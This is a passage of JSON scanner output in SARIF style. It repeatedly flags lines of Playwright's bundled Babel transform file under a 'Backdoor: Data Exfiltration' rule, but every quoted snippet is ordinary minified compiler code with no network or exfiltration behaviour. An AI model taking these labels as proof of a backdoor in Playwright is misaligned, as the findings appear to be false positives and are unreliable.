                      "text": "nitClass\"),Y=e.isClassDeclaration(),{id:Be,path:e}=Jbe(e,s),e.node.decorators=null;let oe=c.map(J=>J.expression),ee=oe.some(bEe),{hasSideEffects:je,decoratorsThis:M}=j(oe),{haveThis:$,decs:W}=zO(oe,M,a);if(re=$?1:0,me=W,(je&&q||ee)&&(Se=v(A.types.arrayExpression(me),\"classDecs\",d)),!f)for(let J of e.get(\"body.body\")){let{node:Ae}=J;if(\"computed\"in Ae&&Ae.computed)if(J.isClassProperty({static:!0})){if(!J.get(\"key\").isConstantExpression()){let _e=Ae.key,Re=(0,tp.memoiseComputedKey)(_e,y,y.generateUid(\"computedKey\"));Re!=null&&(Ae.key=A.types.cloneNode(Re.left),pe.push(Re))}}else pe.length>0&&(vl(pe,J",
                      "markdown": "`nitClass\"),Y=e.isClassDeclaration(),{id:Be,path:e}=Jbe(e,s),e.node.decorators=null;let oe=c.map(J=>J.expression),ee=oe.some(bEe),{hasSideEffects:je,decoratorsThis:M}=j(oe),{haveThis:$,decs:W}=zO(oe,M,a);if(re=$?1:0,me=W,(je&&q||ee)&&(Se=v(A.types.arrayExpression(me),\"classDecs\",d)),!f)for(let J of e.get(\"body.body\")){let{node:Ae}=J;if(\"computed\"in Ae&&Ae.computed)if(J.isClassProperty({static:!0})){if(!J.get(\"key\").isConstantExpression()){let _e=Ae.key,Re=(0,tp.memoiseComputedKey)(_e,y,y.generateUid(\"computedKey\"));Re!=null&&(Ae.key=A.types.cloneNode(Re.left),pe.push(Re))}}else pe.length>0&&(vl(pe,J`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1865,
                  "startColumn": 7772,
                  "endLine": 1865,
                  "endColumn": 7777,
                  "snippet": {
                    "text": "11\")break;default:if(ee.static){var R;(R=D)!=null||(D=_r(y,\"initStatic\"))}else{var K;(K=I)!=null||(I=_r(y,\"initProto\"))}break}f=!0,m||(m=ee.decorators.some(_))}else if(ee.type===\"ClassAccessorProperty\"){i.ClassAccessorProperty(oe,t);let{key:je,value:M,static:$,computed:W}=ee,J=b(),Ae=GO(J,M,$),le=oe.get(\"key\"),[_e]=oe.replaceWith(Ae),Re,we;W&&!le.isConstantExpression()?(Re=(0,tp.memoiseComputedKey)(IE(t,je),y,y.generateUid(\"computedKey\")),we=A.types.cloneNode(Re.left)):(Re=A.types.cloneNode(je),we=A.types.cloneNode(je)),HO(e.node.id,_e,Re,we,J,W,$,a)}\"computed\"in oe.node&&oe.node.computed&&(p||(p=!",
                    "rendered": {
                      "text": "11\")break;default:if(ee.static){var R;(R=D)!=null||(D=_r(y,\"initStatic\"))}else{var K;(K=I)!=null||(I=_r(y,\"initProto\"))}break}f=!0,m||(m=ee.decorators.some(_))}else if(ee.type===\"ClassAccessorProperty\"){i.ClassAccessorProperty(oe,t);let{key:je,value:M,static:$,computed:W}=ee,J=b(),Ae=GO(J,M,$),le=oe.get(\"key\"),[_e]=oe.replaceWith(Ae),Re,we;W&&!le.isConstantExpression()?(Re=(0,tp.memoiseComputedKey)(IE(t,je),y,y.generateUid(\"computedKey\")),we=A.types.cloneNode(Re.left)):(Re=A.types.cloneNode(je),we=A.types.cloneNode(je)),HO(e.node.id,_e,Re,we,J,W,$,a)}\"computed\"in oe.node&&oe.node.computed&&(p||(p=!",
                      "markdown": "`11\")break;default:if(ee.static){var R;(R=D)!=null||(D=_r(y,\"initStatic\"))}else{var K;(K=I)!=null||(I=_r(y,\"initProto\"))}break}f=!0,m||(m=ee.decorators.some(_))}else if(ee.type===\"ClassAccessorProperty\"){i.ClassAccessorProperty(oe,t);let{key:je,value:M,static:$,computed:W}=ee,J=b(),Ae=GO(J,M,$),le=oe.get(\"key\"),[_e]=oe.replaceWith(Ae),Re,we;W&&!le.isConstantExpression()?(Re=(0,tp.memoiseComputedKey)(IE(t,je),y,y.generateUid(\"computedKey\")),we=A.types.cloneNode(Re.left)):(Re=A.types.cloneNode(je),we=A.types.cloneNode(je)),HO(e.node.id,_e,Re,we,J,W,$,a)}\"computed\"in oe.node&&oe.node.computed&&(p||(p=!`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1865,
                  "startColumn": 6579,
                  "endLine": 1865,
                  "endColumn": 6584,
                  "snippet": {
                    "text": ".node.type===\"ForOfStatement\"&&o.node.left===a.node)throw s.buildCodeFrameError(`Decorated private methods are read-only, but \"#${s.node.id.name}\" is updated via this expression.`)}}),n=new Map;for(let s of t)n.set(s,null);e.traverse(r,{privateNamesMap:n})}function TEe(e,t,r,n,s,i,a){var o,l;let u=e.get(\"body.body\"),c=e.node.decorators,f=!1,p=!1,m=!1,b=Xbe(e),d=[],y=e.scope.parent,v=(oe,ee,je)=>{let M=_r(y,ee);return je.push(A.types.assignmentExpression(\"=\",M,oe)),A.types.cloneNode(M)},I,D,O=(o=e.node.id)==null?void 0:o.name,_=oe=>{try{return A.types.traverseFast(oe,ee=>{if(A.types.isThisExpression",
                    "rendered": {
                      "text": ".node.type===\"ForOfStatement\"&&o.node.left===a.node)throw s.buildCodeFrameError(`Decorated private methods are read-only, but \"#${s.node.id.name}\" is updated via this expression.`)}}),n=new Map;for(let s of t)n.set(s,null);e.traverse(r,{privateNamesMap:n})}function TEe(e,t,r,n,s,i,a){var o,l;let u=e.get(\"body.body\"),c=e.node.decorators,f=!1,p=!1,m=!1,b=Xbe(e),d=[],y=e.scope.parent,v=(oe,ee,je)=>{let M=_r(y,ee);return je.push(A.types.assignmentExpression(\"=\",M,oe)),A.types.cloneNode(M)},I,D,O=(o=e.node.id)==null?void 0:o.name,_=oe=>{try{return A.types.traverseFast(oe,ee=>{if(A.types.isThisExpression",
                      "markdown": "`.node.type===\"ForOfStatement\"&&o.node.left===a.node)throw s.buildCodeFrameError(`Decorated private methods are read-only, but \"#${s.node.id.name}\" is updated via this expression.`)}}),n=new Map;for(let s of t)n.set(s,null);e.traverse(r,{privateNamesMap:n})}function TEe(e,t,r,n,s,i,a){var o,l;let u=e.get(\"body.body\"),c=e.node.decorators,f=!1,p=!1,m=!1,b=Xbe(e),d=[],y=e.scope.parent,v=(oe,ee,je)=>{let M=_r(y,ee);return je.push(A.types.assignmentExpression(\"=\",M,oe)),A.types.cloneNode(M)},I,D,O=(o=e.node.id)==null?void 0:o.name,_=oe=>{try{return A.types.traverseFast(oe,ee=>{if(A.types.isThisExpression`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1865,
                  "startColumn": 1707,
                  "endLine": 1865,
                  "endColumn": 1712,
                  "snippet": {
                    "text": ")}function tEe(e,t){if(t){if(e.length>=2&&XO(e[1],t)){let r=A.types.callExpression(A.types.cloneNode(t),[e[0]]);e.splice(0,2,r)}e.length>=2&&A.types.isThisExpression(e[e.length-1])&&XO(e[e.length-2],t)&&e.splice(e.length-1,1)}return Bs(e)}function rEe(e,t,r){t.traverse({CallExpression:{exit(n){if(!n.get(\"callee\").isSuper())return;let s=[n.node,...e.map(i=>A.types.cloneNode(i))];n.isCompletionRecord()&&s.push(A.types.thisExpression()),n.replaceWith(tEe(s,r)),n.skip()}},ClassMethod(n){n.node.kind===\"constructor\"&&n.skip()}})}function JO(e,t){let r=[A.types.expressionStatement(Bs(e))];return t&&r.unsh",
                    "rendered": {
                      "text": ")}function tEe(e,t){if(t){if(e.length>=2&&XO(e[1],t)){let r=A.types.callExpression(A.types.cloneNode(t),[e[0]]);e.splice(0,2,r)}e.length>=2&&A.types.isThisExpression(e[e.length-1])&&XO(e[e.length-2],t)&&e.splice(e.length-1,1)}return Bs(e)}function rEe(e,t,r){t.traverse({CallExpression:{exit(n){if(!n.get(\"callee\").isSuper())return;let s=[n.node,...e.map(i=>A.types.cloneNode(i))];n.isCompletionRecord()&&s.push(A.types.thisExpression()),n.replaceWith(tEe(s,r)),n.skip()}},ClassMethod(n){n.node.kind===\"constructor\"&&n.skip()}})}function JO(e,t){let r=[A.types.expressionStatement(Bs(e))];return t&&r.unsh",
                      "markdown": "`)}function tEe(e,t){if(t){if(e.length>=2&&XO(e[1],t)){let r=A.types.callExpression(A.types.cloneNode(t),[e[0]]);e.splice(0,2,r)}e.length>=2&&A.types.isThisExpression(e[e.length-1])&&XO(e[e.length-2],t)&&e.splice(e.length-1,1)}return Bs(e)}function rEe(e,t,r){t.traverse({CallExpression:{exit(n){if(!n.get(\"callee\").isSuper())return;let s=[n.node,...e.map(i=>A.types.cloneNode(i))];n.isCompletionRecord()&&s.push(A.types.thisExpression()),n.replaceWith(tEe(s,r)),n.skip()}},ClassMethod(n){n.node.kind===\"constructor\"&&n.skip()}})}function JO(e,t){let r=[A.types.expressionStatement(Bs(e))];return t&&r.unsh`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1865,
                  "startColumn": 1021,
                  "endLine": 1865,
                  "endColumn": 1026,
                  "snippet": {
                    "text": "t);else{let s=r.scope.parent,i=(0,tp.memoiseComputedKey)(n.node,s,s.generateUid(\"computedKey\"));if(!i)vl(e,t);else{let a=[...e,A.types.cloneNode(i.left)],o=n.parentPath;o.isSequenceExpression()?o.pushContainer(\"expressions\",a):n.replaceWith(Bs([A.types.cloneNode(i),...a]))}}}function CE(e,t){let r=t.get(\"value\");r.node?e.push(r.node):e.length>0&&(e[e.length-1]=A.types.unaryExpression(\"void\",e[e.length-1])),r.replaceWith(Bs(e))}function Zbe(e,t){t.unshiftContainer(\"body\",A.types.expressionStatement(Bs(e)))}function eEe(e,t){t.node.body.body.unshift(A.types.expressionStatement(Bs(e)))}function XO(e,t",
                    "rendered": {
                      "text": "t);else{let s=r.scope.parent,i=(0,tp.memoiseComputedKey)(n.node,s,s.generateUid(\"computedKey\"));if(!i)vl(e,t);else{let a=[...e,A.types.cloneNode(i.left)],o=n.parentPath;o.isSequenceExpression()?o.pushContainer(\"expressions\",a):n.replaceWith(Bs([A.types.cloneNode(i),...a]))}}}function CE(e,t){let r=t.get(\"value\");r.node?e.push(r.node):e.length>0&&(e[e.length-1]=A.types.unaryExpression(\"void\",e[e.length-1])),r.replaceWith(Bs(e))}function Zbe(e,t){t.unshiftContainer(\"body\",A.types.expressionStatement(Bs(e)))}function eEe(e,t){t.node.body.body.unshift(A.types.expressionStatement(Bs(e)))}function XO(e,t",
                      "markdown": "`t);else{let s=r.scope.parent,i=(0,tp.memoiseComputedKey)(n.node,s,s.generateUid(\"computedKey\"));if(!i)vl(e,t);else{let a=[...e,A.types.cloneNode(i.left)],o=n.parentPath;o.isSequenceExpression()?o.pushContainer(\"expressions\",a):n.replaceWith(Bs([A.types.cloneNode(i),...a]))}}}function CE(e,t){let r=t.get(\"value\");r.node?e.push(r.node):e.length>0&&(e[e.length-1]=A.types.unaryExpression(\"void\",e[e.length-1])),r.replaceWith(Bs(e))}function Zbe(e,t){t.unshiftContainer(\"body\",A.types.expressionStatement(Bs(e)))}function eEe(e,t){t.node.body.body.unshift(A.types.expressionStatement(Bs(e)))}function XO(e,t`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1865,
                  "startColumn": 668,
                  "endLine": 1865,
                  "endColumn": 673,
                  "snippet": {
                    "text": "isIdentifier())return A.types.cloneNode(t.node.left);throw new Error(`Internal Error: the computed key ${e.toString()} has not yet been memoised.`)}function vl(e,t){let r=t.get(\"key\");r.isSequenceExpression()?e.push(...r.node.expressions):e.push(r.node),r.replaceWith(Bs(e))}function Qbe(e,t){let r=t.get(\"key\"),n=OE(r);if(n.isConstantExpression())vl(e,t);else{let s=r.scope.parent,i=(0,tp.memoiseComputedKey)(n.node,s,s.generateUid(\"computedKey\"));if(!i)vl(e,t);else{let a=[...e,A.types.cloneNode(i.left)],o=n.parentPath;o.isSequenceExpression()?o.pushContainer(\"expressions\",a):n.replaceWith(Bs([A.types",
                    "rendered": {
                      "text": "isIdentifier())return A.types.cloneNode(t.node.left);throw new Error(`Internal Error: the computed key ${e.toString()} has not yet been memoised.`)}function vl(e,t){let r=t.get(\"key\");r.isSequenceExpression()?e.push(...r.node.expressions):e.push(r.node),r.replaceWith(Bs(e))}function Qbe(e,t){let r=t.get(\"key\"),n=OE(r);if(n.isConstantExpression())vl(e,t);else{let s=r.scope.parent,i=(0,tp.memoiseComputedKey)(n.node,s,s.generateUid(\"computedKey\"));if(!i)vl(e,t);else{let a=[...e,A.types.cloneNode(i.left)],o=n.parentPath;o.isSequenceExpression()?o.pushContainer(\"expressions\",a):n.replaceWith(Bs([A.types",
                      "markdown": "`isIdentifier())return A.types.cloneNode(t.node.left);throw new Error(`Internal Error: the computed key ${e.toString()} has not yet been memoised.`)}function vl(e,t){let r=t.get(\"key\");r.isSequenceExpression()?e.push(...r.node.expressions):e.push(r.node),r.replaceWith(Bs(e))}function Qbe(e,t){let r=t.get(\"key\"),n=OE(r);if(n.isConstantExpression())vl(e,t);else{let s=r.scope.parent,i=(0,tp.memoiseComputedKey)(n.node,s,s.generateUid(\"computedKey\"));if(!i)vl(e,t);else{let a=[...e,A.types.cloneNode(i.left)],o=n.parentPath;o.isSequenceExpression()?o.pushContainer(\"expressions\",a):n.replaceWith(Bs([A.types`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1865,
                  "startColumn": 540,
                  "endLine": 1865,
                  "endColumn": 545,
                  "snippet": {
                    "text": ";if(t.isIdentifier()&&e.scope.hasUid(t.node.name))return A.types.cloneNode(e.node);if(t.isAssignmentExpression()&&t.get(\"left\").isIdentifier())return A.types.cloneNode(t.node.left);throw new Error(`Internal Error: the computed key ${e.toString()} has not yet been memoised.`)}function vl(e,t){let r=t.get(\"key\");r.isSequenceExpression()?e.push(...r.node.expressions):e.push(r.node),r.replaceWith(Bs(e))}function Qbe(e,t){let r=t.get(\"key\"),n=OE(r);if(n.isConstantExpression())vl(e,t);else{let s=r.scope.parent,i=(0,tp.memoiseComputedKey)(n.node,s,s.generateUid(\"computedKey\"));if(!i)vl(e,t);else{let a=[..",
                    "rendered": {
                      "text": ";if(t.isIdentifier()&&e.scope.hasUid(t.node.name))return A.types.cloneNode(e.node);if(t.isAssignmentExpression()&&t.get(\"left\").isIdentifier())return A.types.cloneNode(t.node.left);throw new Error(`Internal Error: the computed key ${e.toString()} has not yet been memoised.`)}function vl(e,t){let r=t.get(\"key\");r.isSequenceExpression()?e.push(...r.node.expressions):e.push(r.node),r.replaceWith(Bs(e))}function Qbe(e,t){let r=t.get(\"key\"),n=OE(r);if(n.isConstantExpression())vl(e,t);else{let s=r.scope.parent,i=(0,tp.memoiseComputedKey)(n.node,s,s.generateUid(\"computedKey\"));if(!i)vl(e,t);else{let a=[..",
                      "markdown": "`;if(t.isIdentifier()&&e.scope.hasUid(t.node.name))return A.types.cloneNode(e.node);if(t.isAssignmentExpression()&&t.get(\"left\").isIdentifier())return A.types.cloneNode(t.node.left);throw new Error(`Internal Error: the computed key ${e.toString()} has not yet been memoised.`)}function vl(e,t){let r=t.get(\"key\");r.isSequenceExpression()?e.push(...r.node.expressions):e.push(r.node),r.replaceWith(Bs(e))}function Qbe(e,t){let r=t.get(\"key\"),n=OE(r);if(n.isConstantExpression())vl(e,t);else{let s=r.scope.parent,i=(0,tp.memoiseComputedKey)(n.node,s,s.generateUid(\"computedKey\"));if(!i)vl(e,t);else{let a=[..`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1865,
                  "startColumn": 355,
                  "endLine": 1865,
                  "endColumn": 360,
                  "snippet": {
                    "text": "ppers)(e),e.isSequenceExpression()){let t=e.get(\"expressions\");return OE(t[t.length-1])}return e}function zbe(e){let t=OE(e);if(t.isConstantExpression())return A.types.cloneNode(e.node);if(t.isIdentifier()&&e.scope.hasUid(t.node.name))return A.types.cloneNode(e.node);if(t.isAssignmentExpression()&&t.get(\"left\").isIdentifier())return A.types.cloneNode(t.node.left);throw new Error(`Internal Error: the computed key ${e.toString()} has not yet been memoised.`)}function vl(e,t){let r=t.get(\"key\");r.isSequenceExpression()?e.push(...r.node.expressions):e.push(r.node),r.replaceWith(Bs(e))}function Qbe(e,t)",
                    "rendered": {
                      "text": "ppers)(e),e.isSequenceExpression()){let t=e.get(\"expressions\");return OE(t[t.length-1])}return e}function zbe(e){let t=OE(e);if(t.isConstantExpression())return A.types.cloneNode(e.node);if(t.isIdentifier()&&e.scope.hasUid(t.node.name))return A.types.cloneNode(e.node);if(t.isAssignmentExpression()&&t.get(\"left\").isIdentifier())return A.types.cloneNode(t.node.left);throw new Error(`Internal Error: the computed key ${e.toString()} has not yet been memoised.`)}function vl(e,t){let r=t.get(\"key\");r.isSequenceExpression()?e.push(...r.node.expressions):e.push(r.node),r.replaceWith(Bs(e))}function Qbe(e,t)",
                      "markdown": "`ppers)(e),e.isSequenceExpression()){let t=e.get(\"expressions\");return OE(t[t.length-1])}return e}function zbe(e){let t=OE(e);if(t.isConstantExpression())return A.types.cloneNode(e.node);if(t.isIdentifier()&&e.scope.hasUid(t.node.name))return A.types.cloneNode(e.node);if(t.isAssignmentExpression()&&t.get(\"left\").isIdentifier())return A.types.cloneNode(t.node.left);throw new Error(`Internal Error: the computed key ${e.toString()} has not yet been memoised.`)}function vl(e,t){let r=t.get(\"key\");r.isSequenceExpression()?e.push(...r.node.expressions):e.push(r.node),r.replaceWith(Bs(e))}function Qbe(e,t)`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1865,
                  "startColumn": 98,
                  "endLine": 1865,
                  "endColumn": 103,
                  "snippet": {
                    "text": " this.${A.types.cloneNode(e)} = value;\n        }\n      `]:[A.template.expression.ast`\n      o => o.${A.types.cloneNode(e)}\n    `,A.template.expression.ast`\n      (o, v) => o.${A.types.cloneNode(e)} = v\n    `]}function OE(e){if(e=(0,Ns.skipTransparentExprWrappers)(e),e.isSequenceExpression()){let t=e.get(\"expressions\");return OE(t[t.length-1])}return e}function zbe(e){let t=OE(e);if(t.isConstantExpression())return A.types.cloneNode(e.node);if(t.isIdentifier()&&e.scope.hasUid(t.node.name))return A.types.cloneNode(e.node);if(t.isAssignmentExpression()&&t.get(\"left\").isIdentifier())return A.types.clone",
                    "rendered": {
                      "text": " this.${A.types.cloneNode(e)} = value;\n        }\n      `]:[A.template.expression.ast`\n      o => o.${A.types.cloneNode(e)}\n    `,A.template.expression.ast`\n      (o, v) => o.${A.types.cloneNode(e)} = v\n    `]}function OE(e){if(e=(0,Ns.skipTransparentExprWrappers)(e),e.isSequenceExpression()){let t=e.get(\"expressions\");return OE(t[t.length-1])}return e}function zbe(e){let t=OE(e);if(t.isConstantExpression())return A.types.cloneNode(e.node);if(t.isIdentifier()&&e.scope.hasUid(t.node.name))return A.types.cloneNode(e.node);if(t.isAssignmentExpression()&&t.get(\"left\").isIdentifier())return A.types.clone",
                      "markdown": "` this.${A.types.cloneNode(e)} = value;\n        }\n      `]:[A.template.expression.ast`\n      o => o.${A.types.cloneNode(e)}\n    `,A.template.expression.ast`\n      (o, v) => o.${A.types.cloneNode(e)} = v\n    `]}function OE(e){if(e=(0,Ns.skipTransparentExprWrappers)(e),e.isSequenceExpression()){let t=e.get(\"expressions\");return OE(t[t.length-1])}return e}function zbe(e){let t=OE(e);if(t.isConstantExpression())return A.types.cloneNode(e.node);if(t.isIdentifier()&&e.scope.hasUid(t.node.name))return A.types.cloneNode(e.node);if(t.isAssignmentExpression()&&t.get(\"left\").isIdentifier())return A.types.clone`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1853,
                  "startColumn": 7969,
                  "endLine": 1853,
                  "endColumn": 7974,
                  "snippet": {
                    "text": "r?(t=r.name,s=_r(n.parent,t),n.rename(t,s.name)):s=_r(n.parent,typeof t==\"string\"?t:\"decorated_class\");let i=A.types.classExpression(typeof t==\"string\"?A.types.identifier(t):null,e.node.superClass,e.node.body),[a]=e.replaceWith(A.types.sequenceExpression([i,s]));return{id:A.types.cloneNode(s),path:a.get(\"expressions.0\")}}}function GO(e,t,r){return e.type===\"PrivateName\"?A.types.classPrivateProperty(e,t,void 0,r):A.types.classProperty(e,t,void 0,void 0,r)}function HO(e,t,r,n,s,i,a,o){let l=(o===\"2023-11\"||o===\"2023-05\")&&a?e:A.types.thisExpression(),u=A.types.blockStatement([A.types.returnStatement(",
                    "rendered": {
                      "text": "r?(t=r.name,s=_r(n.parent,t),n.rename(t,s.name)):s=_r(n.parent,typeof t==\"string\"?t:\"decorated_class\");let i=A.types.classExpression(typeof t==\"string\"?A.types.identifier(t):null,e.node.superClass,e.node.body),[a]=e.replaceWith(A.types.sequenceExpression([i,s]));return{id:A.types.cloneNode(s),path:a.get(\"expressions.0\")}}}function GO(e,t,r){return e.type===\"PrivateName\"?A.types.classPrivateProperty(e,t,void 0,r):A.types.classProperty(e,t,void 0,void 0,r)}function HO(e,t,r,n,s,i,a,o){let l=(o===\"2023-11\"||o===\"2023-05\")&&a?e:A.types.thisExpression(),u=A.types.blockStatement([A.types.returnStatement(",
                      "markdown": "`r?(t=r.name,s=_r(n.parent,t),n.rename(t,s.name)):s=_r(n.parent,typeof t==\"string\"?t:\"decorated_class\");let i=A.types.classExpression(typeof t==\"string\"?A.types.identifier(t):null,e.node.superClass,e.node.body),[a]=e.replaceWith(A.types.sequenceExpression([i,s]));return{id:A.types.cloneNode(s),path:a.get(\"expressions.0\")}}}function GO(e,t,r){return e.type===\"PrivateName\"?A.types.classPrivateProperty(e,t,void 0,r):A.types.classProperty(e,t,void 0,void 0,r)}function HO(e,t,r,n,s,i,a,o){let l=(o===\"2023-11\"||o===\"2023-05\")&&a?e:A.types.thisExpression(),u=A.types.blockStatement([A.types.returnStatement(`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1853,
                  "startColumn": 7599,
                  "endLine": 1853,
                  "endColumn": 7604,
                  "snippet": {
                    "text": ";while(r.has(n));return A.types.privateName(A.types.identifier(n))}}function Xbe(e){let t;return()=>(t||(t=Ybe(e)),t())}function Jbe(e,t){let r=e.node.id,n=e.scope;if(e.type===\"ClassDeclaration\"){let s=r.name,i=n.generateUidIdentifierBasedOnNode(r),a=A.types.identifier(s);return n.rename(s,i.name),e.get(\"id\").replaceWith(a),{id:A.types.cloneNode(i),path:e}}else{let s;r?(t=r.name,s=_r(n.parent,t),n.rename(t,s.name)):s=_r(n.parent,typeof t==\"string\"?t:\"decorated_class\");let i=A.types.classExpression(typeof t==\"string\"?A.types.identifier(t):null,e.node.superClass,e.node.body),[a]=e.replaceWith(A.types",
                    "rendered": {
                      "text": ";while(r.has(n));return A.types.privateName(A.types.identifier(n))}}function Xbe(e){let t;return()=>(t||(t=Ybe(e)),t())}function Jbe(e,t){let r=e.node.id,n=e.scope;if(e.type===\"ClassDeclaration\"){let s=r.name,i=n.generateUidIdentifierBasedOnNode(r),a=A.types.identifier(s);return n.rename(s,i.name),e.get(\"id\").replaceWith(a),{id:A.types.cloneNode(i),path:e}}else{let s;r?(t=r.name,s=_r(n.parent,t),n.rename(t,s.name)):s=_r(n.parent,typeof t==\"string\"?t:\"decorated_class\");let i=A.types.classExpression(typeof t==\"string\"?A.types.identifier(t):null,e.node.superClass,e.node.body),[a]=e.replaceWith(A.types",
                      "markdown": "`;while(r.has(n));return A.types.privateName(A.types.identifier(n))}}function Xbe(e){let t;return()=>(t||(t=Ybe(e)),t())}function Jbe(e,t){let r=e.node.id,n=e.scope;if(e.type===\"ClassDeclaration\"){let s=r.name,i=n.generateUidIdentifierBasedOnNode(r),a=A.types.identifier(s);return n.rename(s,i.name),e.get(\"id\").replaceWith(a),{id:A.types.cloneNode(i),path:e}}else{let s;r?(t=r.name,s=_r(n.parent,t),n.rename(t,s.name)):s=_r(n.parent,typeof t==\"string\"?t:\"decorated_class\");let i=A.types.classExpression(typeof t==\"string\"?A.types.identifier(t):null,e.node.superClass,e.node.body),[a]=e.replaceWith(A.types`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1853,
                  "startColumn": 6641,
                  "endLine": 1853,
                  "endColumn": 6646,
                  "snippet": {
                    "text": ".hasUid(e.left.name))return Bt.types.cloneNode(e);{let i=Bt.types.identifier(r);return t.push({id:i,kind:\"let\"}),Bt.types.assignmentExpression(\"=\",Bt.types.cloneNode(i),e)}}function Hbe(e,t,r){let{scope:n}=e,s=[],i={classBinding:e.node.id&&n.getBinding(e.node.id.name),file:r};for(let a of t){let o=a.get(\"key\");o.isReferencedIdentifier()?VO(o,i):o.traverse(Kbe,i);let l=a.node;if(!o.isConstantExpression()){let u=$O(o.node,n,n.generateUidBasedOnNode(o.node));u&&(s.push(Bt.types.expressionStatement(u)),l.key=Bt.types.cloneNode(u.left))}}return s}});var n_=E(_E=>{\"use strict\";Object.defineProperty(_E,\"_",
                    "rendered": {
